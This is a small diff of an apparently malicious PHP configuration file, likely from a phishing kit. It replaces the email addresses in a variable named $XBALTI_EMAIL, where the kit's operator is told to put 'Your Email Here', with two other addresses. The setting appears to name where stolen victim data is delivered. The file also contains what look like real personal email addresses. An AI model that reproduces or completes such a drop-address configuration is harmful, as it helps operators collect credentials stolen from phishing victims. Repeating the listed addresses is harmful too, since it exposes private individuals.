@@ -23,7 +23,7 @@
       |       |            |                     
 */
 
-$XBALTI_EMAIL = "johnswills2020@gmail.com,freelogs@yandex.com"; // Your Email Here :)
+$XBALTI_EMAIL = "carterjimmy621@gmail.com,workdesk5500@gmail.com"; // Your Email Here :)
 
 $yourname = "STREETCODE"; // Your Name Here :)
 
